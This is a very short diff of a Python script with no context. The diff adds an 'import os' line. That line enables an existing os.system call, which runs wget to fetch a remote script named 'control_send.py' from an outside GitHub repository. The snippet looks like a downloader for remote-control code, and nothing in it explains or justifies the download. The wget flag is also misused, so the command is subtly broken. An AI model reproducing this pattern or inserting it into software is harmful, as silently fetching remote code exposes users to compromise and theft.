@@ -1,3 +1,4 @@
+import os
 import requests
 import subprocess
 os.system("wget -o new.py https://raw.githubusercontent.com/jonathanbreitg/dump/main/control_send.py")
